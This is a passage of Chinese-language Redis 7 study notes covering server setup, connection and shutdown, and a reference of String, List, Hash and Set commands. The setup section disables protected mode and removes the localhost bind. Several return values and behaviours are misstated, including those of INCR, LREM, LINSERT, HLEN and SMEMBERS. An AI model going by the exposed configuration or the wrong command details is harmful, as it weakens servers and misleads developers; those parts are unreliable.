<li><p><strong>redis-check-aof</strong>：AOF 文件修复工具。用于检查和修复 AOF（Append Only File）日志文件中的错误，保证数据的一致性和完整性。</p>
</li>
<li><p>**<code>redis-cli</code>**：命令行客户端工具。用于与 Redis 服务器进行交互，执行各种命令来管理数据、查询状态等。</p>
</li>
<li><p>**<code>redis-server</code>**：Redis 服务器程序。用于启动和运行 Redis 服务，处理来自客户端的请求并维护数据存储。</p>
</li>
</ul>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>Redis配置文件在原解压目录下，名为<code>redis.conf</code>。需要进行部分初始化配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/redis-7.0.15</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个配置文件夹</span></span><br><span class="line">mkdir /myredis</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拷贝配置文件，在拷贝的基础上修改，避免破坏原文件。</span></span><br><span class="line">cp redis.conf /myredis/redis7.conf</span><br><span class="line">cd /myredis</span><br></pre></td></tr></table></figure>

<p>需要修改如下配置项（在vim下使用<code>/</code>可以快速查找）：</p>
<ol>
<li>默认<code>daemonize no</code>，改为<code>daemonize yes</code>：作为服务器后端启动而不是在前台运行</li>
<li>默认<code>protected-mode yes</code>，改为<code>protected-mode no</code>：关闭保护模式，使其他程序可以连接</li>
<li>默认<code>bind 127.0.0.1</code>(通常全名是bind 127.0.0.1 -::1），直接注释掉：默认只能本机访问，注释以避免影响远程IP连接</li>
<li>添加redis密码，改为requirepass自己设置的密码（一般原来是被注释的 <code>requirepass foobared</code>)：避免黑客攻击</li>
</ol>
<p><strong>启动redis</strong>(每次修改配置文件后需要重启redis)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以指定配置文件启动redis</span></span><br><span class="line">redis-server /myredis/redis7.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务是否启动成功</span></span><br><span class="line">ps -ef|grep redis</span><br></pre></td></tr></table></figure>

<p><strong>连接Redis</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -a 密码 -p 连接端口：在本机连接时可以不设置端口，默认使用6379。</span></span><br><span class="line"><span class="comment"># 使用此方法会出现一个warning，称使用 -a不安全，可以忽略，或者分两步登录  redis-cli 和 auth password</span></span><br><span class="line">redis-cli -a fsy123 -p 6379</span><br><span class="line"><span class="comment"># 验证连接是否成功，在redis的命令行中输入，如返回PONG，则成功</span></span><br><span class="line">ping</span><br><span class="line"><span class="comment"># 退出客户端</span></span><br><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>使用redis:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 存储键值对数据</span></span><br><span class="line"><span class="built_in">set</span> key1 helloworld</span><br><span class="line"><span class="comment"># 查看数据</span></span><br><span class="line">get key1</span><br></pre></td></tr></table></figure>

<p><strong>关闭Redis</strong>：在redis客户端命令行中使用<code>SHUTDOWN</code>命令关闭服务后再使用<code>quit</code>退出或在linux的shell中按如下方式：</p>
<ul>
<li>单实例（本机仅一个redis运行在一个端口）关闭：<code>redis-cli -a fsy123 shutdown</code></li>
<li>多实例（本机有多个redis运行在不同端口）关闭：<code>redis-cli -p 端口号 shutdown</code></li>
</ul>
<h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h4><p>1、停止服务</p>
<p>2、<code>rm -rf /usr/local/bin/redis-*</code></p>
<h3 id="笔记平台"><a href="#笔记平台" class="headerlink" title="笔记平台"></a>笔记平台</h3><p>（1） Redis7.0.15</p>
<p>（2）SpringBoot3.0.5</p>
<p>（3）JDK17</p>
<p>（4） IDEA2022</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><strong>主要参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV13R4y1v7sP?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷Redis7教程</a></p>
<p><a href="https://www.bilibili.com/video/BV13R4y1v7sP?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=100">尚硅谷Redis7高级篇</a></p>
<p><a href="https://github.com/antirez">Redis之父Github</a></p>
<p><a href="https://antirez.com/latest/0">Redis之父个人博客</a></p>
<p><a href="https://redis.io/">Redis英语官网</a></p>
<p><a href="https://redis.com.cn/">Redis中文文档</a></p>
<p><a href="https://github.com/redis/redis">Redis源码</a></p>
<p><a href="http://doc.redisfans.com/">Redis命令参考</a></p>
<p><a href="https://github.com/redis/redis/releases">Redis历史版本对比</a></p>
<p><strong>其他参考资料：</strong></p>
<p><a href="https://www.bilibili.com/video/BV1Rv41177Af/?spm_id_from=333.1387.search.video_card.click&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷Redis6教程</a></p>
<p><a href="https://blog.csdn.net/m0_55993923/article/details/129718974">Redis7笔记-CSDN晓风残月Lx</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>中文乱码的解决：<code>redis-cli --raw</code></p>
<hr>
<h2 id="二、十大数据类型"><a href="#二、十大数据类型" class="headerlink" title="二、十大数据类型"></a>二、十大数据类型</h2><p>这里说的数据类型是Value的数据类型，Key的数据类型一般是字符串。</p>
<ol>
<li><strong>String（字符串）</strong>：最基本的数据类型，可以存储字符串、整数或浮点数，支持增减操作。</li>
<li><strong>List（列表）</strong>：按照插入顺序排序的字符串链表，支持从两端推入或弹出元素。</li>
<li><strong>Set（集合）</strong>：不重复的字符串集合，支持集合间运算如交集、并集等。</li>
<li><strong>Sorted Set（有序集合）</strong>：每个元素关联一个分数以进行排序的集合，支持基于分数的操作。</li>
<li><strong>Hash（哈希）</strong>：键值对的集合，适合存储对象，支持单个字段的读写。</li>
<li><strong>HyperLogLog（基数统计）</strong>：用于基数估计的数据结构，可以在大数据集上估算不同元素的数量。</li>
<li><strong>Bitmaps（位图）</strong>：通过位操作实现的布尔型操作集合，适用于实时分析和统计。</li>
<li><strong>Bit Field（位域）</strong>：允许对整数数组执行按位操作，支持增量和获取操作。</li>
<li><strong>Streams（流）</strong>：提供消息队列功能，支持复杂的消费模式，如消费者组。</li>
<li><strong>Geospatial indexes（地理空间索引）</strong>：专为存储和查询地理位置坐标设计，支持距离计算和范围查找。</li>
</ol>
<p><a href="https://redis.io/docs/latest/commands/">官方文档查看命令</a></p>
<p><a href="https://redis.com.cn/commands.html">中文文档命令查看</a></p>
<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h4 id="数据库相关命令"><a href="#数据库相关命令" class="headerlink" title="数据库相关命令"></a>数据库相关命令</h4><p><a href="https://redis.com.cn/commands.html">中文文档命令查看</a></p>
<p>以下是Redis中与数据库相关的常用命令及其功能的简要概述（<strong>注</strong>：[0-15]表示可在0-15中选一个值）：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>select [0-15]</code></td>
<td>切换数据库，可选0-15，默认情况下查看的是0号数据库</td>
</tr>
<tr>
<td><code>dbsize</code></td>
<td>查看当前数据库下有多少个key</td>
</tr>
<tr>
<td><code>flushdb</code></td>
<td>清空当前数据库，日常不可使用！！</td>
</tr>
<tr>
<td><code>flushall</code></td>
<td>清空全部数据库，日常不可使用！！</td>
</tr>
</tbody></table>
<h4 id="KEY相关命令"><a href="#KEY相关命令" class="headerlink" title="KEY相关命令"></a>KEY相关命令</h4><p><code>KEY</code><strong>值区分大小写</strong></p>
<p><a href="https://redis.com.cn/commands.html">中文文档命令查看</a></p>
<p>以下是Redis中与KEY（键）相关的常用命令及其功能的简要概述（<strong>注</strong>：key是具体的key值，keys是命令）：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>keys *</code></td>
<td>查看当前数据库拥有的所有key</td>
</tr>
<tr>
<td><code>exists key</code></td>
<td>检查键是否存在。若存在则返回1，否则返回0。</td>
</tr>
<tr>
<td><code>type key</code></td>
<td>返回键所存储的值的类型。如string, list, set等。</td>
</tr>
<tr>
<td><code>del key</code></td>
<td>删除指定的键。如果键不存在，则返回0。</td>
</tr>
<tr>
<td><code>unlink key</code></td>
<td>非阻塞式删除，仅仅将keys从keyspace元数据中删除，真正的删除会在后续异步进行</td>
</tr>
<tr>
<td><code>tll key</code></td>
<td>获取键剩余的生存时间（秒）。若无过期时间返回-1；若不存在返回-2。</td>
</tr>
<tr>
<td><code>pttl key</code></td>
<td>类似于TTL，但返回的时间单位是毫秒。</td>
</tr>
<tr>
<td><code>expire key seconds</code></td>
<td>设置键的过期时间，单位为秒。</td>
</tr>
<tr>
<td><code>move key [0-15]</code></td>
<td>将当前数据库的key移动到给定的数据库db中</td>
</tr>
<tr>
<td><code>persist key</code></td>
<td>移除键的过期时间，使其持久化保存。</td>
</tr>
<tr>
<td><code>keys pattern</code></td>
<td>查找所有符合给定模式的键。使用时需小心，因为它会遍历整个键空间，可能影响性能。</td>
</tr>
<tr>
<td><code>rename key newkey</code></td>
<td>将键重命名为新的键名。如果新键已存在，则会被覆盖。</td>
</tr>
<tr>
<td><code>renamenx key newkey</code></td>
<td>只有当新键不存在时，才对键进行重命名。</td>
</tr>
</tbody></table>
<h4 id="大小写说明和帮助命令"><a href="#大小写说明和帮助命令" class="headerlink" title="大小写说明和帮助命令"></a>大小写说明和帮助命令</h4><p>Redis中命令不区分大小写，<strong>但<code>KEY</code>值区分大小写</strong></p>
<p>帮助命令：<code>help @类型</code>可以查看与类型相关的命令。</p>
<h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><p><a href="https://redis.com.cn/commands.html">中文文档命令查看</a></p>
<h4 id="【重要】SET"><a href="#【重要】SET" class="headerlink" title="【重要】SET"></a>【重要】SET</h4><p>以下是Redis中与String（字符串）数据类型相关的常见命令<code>SET</code>及其功能的简要概述，按照你指定的形式展示：</p>
<p><strong>命令:</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SET key value [NX|XX] [GET] [EX seconds|PX milliseconds|EXAT unix-time-seconds|PXAT unix-time-milliseconds|KEEPTTL]</span><br></pre></td></tr></table></figure>

<p><strong>可选参数：</strong></p>
<ul>
<li><strong>NX</strong>: 仅在键不存在时设置键。如果键已存在，则操作失败。</li>
<li><strong>XX</strong>: 仅在键已经存在时设置键。如果键不存在，则操作失败。</li>
<li><strong>GET</strong>: 在设置键之前返回其旧值。此选项仅在Redis 6.0及以上版本可用。</li>
<li><strong>EX seconds</strong>: 设置键的过期时间为指定的秒数。</li>
<li><strong>PX milliseconds</strong>: 设置键的过期时间为指定的毫秒数。</li>
<li><strong>EXAT unix-time-seconds</strong>: 设置键的过期时间到指定的Unix时间（秒）。</li>
<li><strong>PXAT unix-time-milliseconds</strong>: 设置键的过期时间到指定的Unix时间（毫秒）。</li>
<li><strong>KEEPTTL</strong>: 保留键的现有过期时间不变。</li>
</ul>
<p><strong>返回值：</strong></p>
<ul>
<li>成功执行时，通常返回<code>OK</code>。</li>
<li>使用<code>NX</code>或<code>XX</code>选项且条件不满足时，返回<code>nil</code>。</li>
<li>使用<code>GET</code>选项时，返回被覆盖前的旧值或者<code>nil</code>（如果键不存在）。</li>
</ul>
<p>另：<code>SETEX key seconds value</code>，相当于 <code>SET key value</code>  + <code>EXPIRE key seconds</code></p>
<hr>
<h4 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h4><p><strong>命令：</strong><code>GET key</code></p>
<p><strong>功能</strong>：获取存储在指定键中的字符串值。</p>
<p><strong>可选参数：</strong>无</p>
<p><strong>返回值</strong>：</p>
<ul>
<li>成功时返回键对应的字符串值。</li>
<li>如果键不存在，返回<code>nil</code>。</li>
</ul>
<hr>
<h4 id="MSET"><a href="#MSET" class="headerlink" title="MSET"></a>MSET</h4><p><strong>命令：</strong><code>MSET key value [key value ...]</code></p>
<p><strong>功能：</strong>同时设置多个键值对</p>
<p><strong>可选参数</strong>：多个键值对作为参数传递。</p>
<p><strong>返回值</strong>：总是返回<code>OK</code>。</p>
<p>另：<code>MSETNX key value [key value ...]</code> ：仅在所有键都不存在时设置键，如有一个失败，全部失败。</p>
<hr>
<h4 id="MGET"><a href="#MGET" class="headerlink" title="MGET"></a>MGET</h4><p><strong>命令</strong>：<code>MGET key [key ...]</code></p>
<p><strong>功能：</strong>获取所有给定键的值。</p>
<p><strong>可选参数</strong>：多个键作为参数传递。</p>
<p><strong>返回值</strong>：包含每个键对应值的数组，如果键不存在，则对应位置的值为<code>nil</code>。</p>
<hr>
<h4 id="GETRANGE"><a href="#GETRANGE" class="headerlink" title="GETRANGE"></a>GETRANGE</h4><p><strong>命令</strong>：<code>GETRANGE key start end</code></p>
<p><strong>功能</strong>：获取存储在键中的字符串的一部分，从开始索引到结束索引（包括两端）。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><strong>start</strong>: 开始索引（包含）。</li>
<li><strong>end</strong>: 结束索引（包含）。</li>
</ul>
<p><strong>返回值</strong>：指定范围内的子串。</p>
<hr>
<h4 id="SETRANGE"><a href="#SETRANGE" class="headerlink" title="SETRANGE"></a>SETRANGE</h4><p><strong>命令</strong>：<code>SETRANGE key offset value</code></p>
<p><strong>功能</strong>：从指定偏移量开始覆盖键存储的字符串部分。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><strong>offset</strong>: 起始位置。</li>
<li><strong>value</strong>: 要设置的新值。</li>
</ul>
<p><strong>返回值</strong>：修改后字符串的长度。</p>
<hr>
<h4 id="APPEND"><a href="#APPEND" class="headerlink" title="APPEND"></a>APPEND</h4><p><strong>命令</strong>：<code>APPEND key value</code></p>
<p><strong>功能</strong>：如果键已经存在并且是一个字符串，则将给定的值追加到该字符串的末尾。如果键不存在，则它等同于<code>SET</code>操作。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：返回追加后的字符串长度。</p>
<hr>
<h4 id="STRLEN"><a href="#STRLEN" class="headerlink" title="STRLEN"></a>STRLEN</h4><p><strong>命令</strong>：<code>STRLEN key</code></p>
<p><strong>功能</strong>：返回键所存储的字符串值的长度。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：字符串的长度。如果键不存在，返回0。</p>
<hr>
<h4 id="INCR"><a href="#INCR" class="headerlink" title="INCR"></a>INCR</h4><p><strong>命令</strong>：<code>INCR key</code></p>
<p><strong>功能</strong>：将键存储的整数值增加1。如果键不存在或不是整数则报错。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：增加后的值。</p>
<hr>
<h4 id="INCRBY"><a href="#INCRBY" class="headerlink" title="INCRBY"></a>INCRBY</h4><p><strong>命令</strong>：<code>INCRBY key increment</code></p>
<p><strong>功能</strong>：将键存储的整数值增加指定的整数增量。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><strong>increment</strong>: 需要增加的整数值。</li>
</ul>
<p><strong>返回值</strong>：增加后的值。</p>
<hr>
<h4 id="DECR"><a href="#DECR" class="headerlink" title="DECR"></a>DECR</h4><p><strong>命令</strong>：<code>DECR key</code></p>
<p><strong>功能</strong>：将键存储的整数值减少1。如果键不存在或不是整数则报错。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：减少后的值。</p>
<hr>
<h4 id="DECRBY"><a href="#DECRBY" class="headerlink" title="DECRBY"></a>DECRBY</h4><p><strong>命令</strong>：<code>DECRBY key decrement</code></p>
<p><strong>功能</strong>：将键存储的整数值减少指定的整数减量。</p>
<p><strong>可选参数</strong>：</p>
<ul>
<li><strong>decrement</strong>: 需要减少的整数值。</li>
</ul>
<p><strong>返回值</strong>：减少后的值。</p>
<hr>
<h4 id="GETSET"><a href="#GETSET" class="headerlink" title="GETSET"></a>GETSET</h4><p>命令：<code>GETSET key value</code></p>
<p><strong>功能</strong>：设置键为新值，并返回旧值。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：键的旧值。如果键不存在，则返回<code>nil</code>。</p>
<h3 id="List类型"><a href="#List类型" class="headerlink" title="List类型"></a>List类型</h3><p>底层是一个双端链表，<strong>允许有重复元素</strong>，容量是$2^{32}-1$个元素（约40亿），两端操作性能很高，通过索引下标操作中间的节点性能较差。</p>
<p>应用场景举例：</p>
<h4 id="LPUSH"><a href="#LPUSH" class="headerlink" title="LPUSH"></a>LPUSH</h4><p><strong>命令</strong>：<code>LPUSH key value [value ...]</code><br><strong>功能</strong>：将一个或多个值插入到列表的头部（最左侧）。如果键不存在，则在执行操作前创建一个空列表。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>key</strong>: 列表的键。</li>
<li><strong>value [value …]</strong>: 一个或多个要插入到列表头部的值。</li>
</ul>
<p><strong>返回值</strong>：操作后列表的长度。</p>
<hr>
<h4 id="RPUSH"><a href="#RPUSH" class="headerlink" title="RPUSH"></a>RPUSH</h4><p><strong>命令</strong>：<code>RPUSH key value [value ...]</code><br><strong>功能</strong>：将一个或多个值插入到列表的尾部（最右侧）。如果键不存在，则在执行操作前创建一个空列表。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>key</strong>: 列表的键。</li>
<li><strong>value [value …]</strong>: 一个或多个要插入到列表尾部的值。</li>
</ul>
<p><strong>返回值</strong>：操作后列表的长度。</p>
<hr>
<h4 id="LPOP"><a href="#LPOP" class="headerlink" title="LPOP"></a>LPOP</h4><p><strong>命令</strong>：<code>LPOP key</code><br><strong>功能</strong>：移除并返回列表的第一个元素（头部）。<br><strong>可选参数</strong>：无<br><strong>返回值</strong>：</p>
<ul>
<li>被移除的元素。</li>
<li>如果列表为空或键不存在，则返回<code>nil</code>。</li>
</ul>
<hr>
<h4 id="RPOP"><a href="#RPOP" class="headerlink" title="RPOP"></a>RPOP</h4><p><strong>命令</strong>：<code>RPOP key</code><br><strong>功能</strong>：移除并返回列表的最后一个元素（尾部）。<br><strong>可选参数</strong>：无<br><strong>返回值</strong>：</p>
<ul>
<li>被移除的元素。</li>
<li>如果列表为空或键不存在，则返回<code>nil</code>。</li>
</ul>
<hr>
<h4 id="LRANGE"><a href="#LRANGE" class="headerlink" title="LRANGE"></a>LRANGE</h4><p><strong>命令</strong>：<code>LRANGE key start stop</code><br><strong>功能</strong>：返回列表中指定范围内的元素。索引从0开始，负数表示从列表末尾开始计数（-1表示最后一个元素）。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>start</strong>: 开始索引（包含）。</li>
<li><strong>stop</strong>: 结束索引（包含）。</li>
</ul>
<p><strong>返回值</strong>：指定范围内的元素列表。</p>
<hr>
<h4 id="LINDEX"><a href="#LINDEX" class="headerlink" title="LINDEX"></a>LINDEX</h4><p><strong>命令</strong>：<code>LINDEX key index</code><br><strong>功能</strong>：返回列表中指定索引处的元素。索引从0开始，负数表示从列表末尾开始计数（-1表示最后一个元素）。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>index</strong>: 元素的索引位置。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>指定索引处的元素。</li>
<li>如果索引超出范围或键不存在，则返回<code>nil</code>。</li>
</ul>
<hr>
<h4 id="LLEN"><a href="#LLEN" class="headerlink" title="LLEN"></a>LLEN</h4><p><strong>命令</strong>：<code>LLEN key</code><br><strong>功能</strong>：返回列表的长度。如果键不存在，则返回0。<br><strong>可选参数</strong>：无<br><strong>返回值</strong>：列表的长度。</p>
<hr>
<h4 id="LTRIM"><a href="#LTRIM" class="headerlink" title="LTRIM"></a>LTRIM</h4><p><strong>命令</strong>：<code>LTRIM key start stop</code><br><strong>功能</strong>：修剪列表，使其只保留指定范围内的元素。其他元素将被删除。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>start</strong>: 开始索引（包含），是具体数字。</li>
<li><strong>stop</strong>: 结束索引（包含），是具体数字。</li>
</ul>
<p><strong>返回值</strong>：总是返回<code>OK</code>。</p>
<hr>
<h4 id="LREM"><a href="#LREM" class="headerlink" title="LREM"></a>LREM</h4><p><strong>命令</strong>：<code>LREM key N value</code><br><strong>功能</strong>：从左往右删除N个值为value的元素（List允许重复元素）。<br><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：总是返回N。</p>
<hr>
<h4 id="RPOPLPUSH"><a href="#RPOPLPUSH" class="headerlink" title="RPOPLPUSH"></a>RPOPLPUSH</h4><p><strong>命令</strong>：<code>RPOPLPUSH key key1</code><br><strong>功能</strong>：从列表key右端删除一个值并把删除的值从列表key1左端加入。<br><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：返回被操作的值</p>
<hr>
<h4 id="LSET"><a href="#LSET" class="headerlink" title="LSET"></a>LSET</h4><p><strong>命令</strong>：<code>LSET key index value</code><br><strong>功能</strong>：从列表key中设置下标是index（从0开始）的元素为value。<br><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：总是返回<code>OK</code>。</p>
<hr>
<h4 id="LINSERT"><a href="#LINSERT" class="headerlink" title="LINSERT"></a>LINSERT</h4><p><strong>命令</strong>：<code>LINSERT key before/after value value1</code><br><strong>功能</strong>：在值value前&#x2F;后插入值value1<br><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：总是返回<code>OK</code>。</p>
<hr>
<h4 id="BLPOP"><a href="#BLPOP" class="headerlink" title="BLPOP"></a>BLPOP</h4><p><strong>命令</strong>：<code>BLPOP key [key ...] timeout</code><br><strong>功能</strong>：阻塞版本的<code>LPOP</code>。它会阻塞连接直到有元素可以弹出或超时。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>key [key …]</strong>: 一个或多个列表的键。</li>
<li><strong>timeout</strong>: 阻塞时间（秒），0表示无限期等待。</li>
</ul>
<p><strong>返回值</strong>：一个数组，第一个元素是被弹出元素的键名，第二个元素是被弹出的值。如果超时则返回<code>nil</code>。</p>
<hr>
<h4 id="BRPOP"><a href="#BRPOP" class="headerlink" title="BRPOP"></a>BRPOP</h4><p><strong>命令</strong>：<code>BRPOP key [key ...] timeout</code><br><strong>功能</strong>：阻塞版本的<code>RPOP</code>。它会阻塞连接直到有元素可以弹出或超时。<br><strong>可选参数</strong>：</p>
<ul>
<li><strong>key [key …]</strong>: 一个或多个列表的键。</li>
<li><strong>timeout</strong>: 阻塞时间（秒），0表示无限期等待。</li>
</ul>
<p><strong>返回值</strong>：一个数组，第一个元素是被弹出元素的键名，第二个元素是被弹出的值。如果超时则返回<code>nil</code>。</p>
<h3 id="Hash类型"><a href="#Hash类型" class="headerlink" title="Hash类型"></a>Hash类型</h3><p>类似于Java中的hashmap，即键值对类型，所以hash类型数据相当于map&lt;key,map&lt;object,object&gt;&gt;</p>
<p>应用场景：中小厂商城购物车，添加相当于对key为用户购物车编号field为产品编号的数据执行了HINCRBY</p>
<h4 id="HSET"><a href="#HSET" class="headerlink" title="HSET"></a>HSET</h4><p><strong>命令：</strong><code>HSET key field value [field value ...]</code></p>
<p><strong>功能</strong>：将哈希表 <code>key</code> 中的字段 <code>field</code> 的值设置为 <code>value</code>。如果 <code>field</code> 已经存在，<strong>则覆盖旧值</strong>。</p>
<p><strong>参数：</strong></p>
<ul>
<li><strong>field</strong>: 哈希表中的字段。</li>
<li><strong>value</strong>: 字段对应的值。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果创建了新的字段，返回 <code>1</code>。</li>
<li>如果更新了已有的字段，返回 <code>0</code>。</li>
</ul>
<p>令：</p>
<p><strong>HMSET命令：</strong><code>HMSET key field value [field value ...]</code></p>
<p><strong>功能</strong>：同时设置哈希表 <code>key</code> 中多个字段的值。<strong>功能与hset重复，弃用</strong></p>
<p><strong>HSETNX命令：</strong><code>HSETNX key field value [field value ...]</code></p>
<p><strong>功能</strong>：将哈希表 <code>key</code> 中的字段 <code>field</code> 的值设置为 <code>value</code>。如果 <code>field</code> 已经存在，<strong>则不添加</strong>。</p>
<hr>
<h4 id="HGET"><a href="#HGET" class="headerlink" title="HGET"></a>HGET</h4><p><strong>命令：</strong><code>HGET key field</code></p>
<p><strong>功能</strong>：获取存储在哈希表 <code>key</code> 中给定字段 <code>field</code> 的值。</p>
<p><strong>参数：</strong></p>
<ul>
<li><strong>field</strong>: 哈希表中的字段。</li>
</ul>
<p><strong>返回值</strong>：</p>
<ul>
<li>成功时返回字段对应的值。</li>
<li>如果字段或键不存在，返回 <code>nil</code>。</li>
</ul>
<hr>
<h4 id="HMGET"><a href="#HMGET" class="headerlink" title="HMGET"></a>HMGET</h4><p>【功能与hget重复，弃用】</p>
<p><strong>命令：</strong><code>HMGET key field [field ...]</code></p>
<p><strong>功能</strong>：获取哈希表 <code>key</code> 中一个或多个字段的值。</p>
<p><strong>参数：</strong></p>
<ul>
<li><strong>field [field …]</strong>: 一个或多个字段。</li>
</ul>
<p><strong>返回值</strong>：包含每个字段对应值的数组。对于不存在的字段，返回 <code>nil</code>。</p>
<hr>
<h4 id="HLEN"><a href="#HLEN" class="headerlink" title="HLEN"></a>HLEN</h4><p><strong>命令：</strong><code>HLEN key</code></p>
<p><strong>功能</strong>：获取哈希表中字段数量。</p>
<p><strong>可选参数：</strong>无</p>
<p><strong>返回值</strong>：返回包含字段和值的数组，字段和值交替出现。如果键不存在，返回空列表。</p>
<hr>
<h4 id="HGETALL"><a href="#HGETALL" class="headerlink" title="HGETALL"></a>HGETALL</h4><p><strong>命令：</strong><code>HGETALL key</code></p>
<p><strong>功能</strong>：获取哈希表中所有字段和其对应的值。</p>
<p><strong>可选参数：</strong>无</p>
<p><strong>返回值</strong>：返回包含字段和值的数组，字段和值交替出现。如果键不存在，返回空列表。</p>
<h4 id="HDEL"><a href="#HDEL" class="headerlink" title="HDEL"></a>HDEL</h4><p><strong>命令：</strong><code>HDEL key field [field ...]</code></p>
<p><strong>功能</strong>：删除哈希表 <code>key</code> 中的一个或多个字段。如果字段不存在则忽略。</p>
<p><strong>可选参数：</strong></p>
<ul>
<li><strong>field [field …]</strong>: 一个或多个字段。</li>
</ul>
<p><strong>返回值</strong>：被成功删除的字段数量。</p>
<hr>
<h4 id="HEXISTS"><a href="#HEXISTS" class="headerlink" title="HEXISTS"></a>HEXISTS</h4><p><strong>命令：</strong><code>HEXISTS key field</code></p>
<p><strong>功能</strong>：检查哈希表 <code>key</code> 中是否存在指定字段。</p>
<p><strong>可选参数：</strong>无</p>
<p><strong>返回值</strong>：如果字段存在，返回 <code>1</code>；否则返回 <code>0</code>。</p>
<hr>
<h4 id="HINCRBY"><a href="#HINCRBY" class="headerlink" title="HINCRBY"></a>HINCRBY</h4><p><strong>命令：</strong><code>HINCRBY key field increment</code></p>
<p><strong>功能</strong>：将哈希表 <code>key</code> 中字段 <code>field</code> 的整数值增加 <code>increment</code>。</p>
<p><strong>可选参数：</strong>无</p>
<p><strong>返回值</strong>：增加后的字段值。</p>
<p>另：</p>
<p><strong>命令：</strong><code>HINCRBYFLOAT key field increment</code></p>
<p><strong>功能</strong>：将哈希表 <code>key</code> 中字段 <code>field</code> 的值增加 <code>increment</code>，increment为浮点数。</p>
<hr>
<h4 id="HKEYS"><a href="#HKEYS" class="headerlink" title="HKEYS"></a>HKEYS</h4><p><strong>命令：</strong><code>HKEYS key</code></p>
<p><strong>功能</strong>：获取哈希表 <code>key</code> 中所有字段的名称。</p>
<p><strong>可选参数：</strong></p>
<p><strong>返回值</strong>：包含所有字段名称的数组。如果键不存在，返回空列表。</p>
<hr>
<h4 id="HVALS"><a href="#HVALS" class="headerlink" title="HVALS"></a>HVALS</h4><p><strong>命令：</strong><code>HVALS key</code></p>
<p><strong>功能</strong>：获取哈希表 <code>key</code> 中所有字段的值。</p>
<p><strong>可选参数：</strong></p>
<p><strong>返回值</strong>：包含所有字段值的数组。如果键不存在，返回空列表。</p>
<h3 id="Set类型"><a href="#Set类型" class="headerlink" title="Set类型"></a>Set类型</h3><p>类似Java中的set，单键多value，<strong>无序不可重复</strong></p>
<p>应用场景：</p>
<ul>
<li>抽奖程序：有多少人参加SCARD；随机抽奖2人，不可重复抽奖SPOP</li>
<li>微信朋友圈：共同点赞好友SINTER；点赞数SCARD；所有点赞用户SMEMBERS；</li>
<li>可能认识的人：SDIFF</li>
</ul>
<hr>
<h4 id="SADD"><a href="#SADD" class="headerlink" title="SADD"></a>SADD</h4><p><strong>命令</strong>：<code>SADD key member [member ...]</code></p>
<p><strong>功能</strong>：将一个或多个成员添加到集合中。如果成员已经是集合的一员，则不会重复添加（<strong>自动去重</strong>）。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：操作成功后返回被添加到集合中的新成员数量（不包括已经存在于集合中的成员）。</p>
<hr>
<h4 id="SMEMBERS"><a href="#SMEMBERS" class="headerlink" title="SMEMBERS"></a>SMEMBERS</h4><p><strong>命令</strong>：<code>SMEMBERS key</code></p>
<p><strong>功能</strong>：返回存储在键中的集合的所有成员。成员按照插入顺序返回。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：包含集合中所有成员的列表。当键不存在时，返回空列表。</p>
<hr>
<h4 id="SISMEMBER"><a href="#SISMEMBER" class="headerlink" title="SISMEMBER"></a>SISMEMBER</h4><p><strong>命令</strong>：<code>SISMEMBER key member</code></p>
<p><strong>功能</strong>：判断成员是否是存储在键中的集合的成员。</p>
<p><strong>可选参数</strong>：无</p>
<p><strong>返回值</strong>：</p>
<ul>
<li>如果成员是集合的一员，返回1。</li>
<li>如果成员不是集合的一员，返回0。</li>
<li>如果键不存在，同样返回0。</li>
</ul>
<hr>
<h4 id="SREM"><a href="#SREM" class="headerlink" title="SREM"></a>SREM</h4><p><strong>命令</strong>：<code>SREM key member [member ...]</code></p>
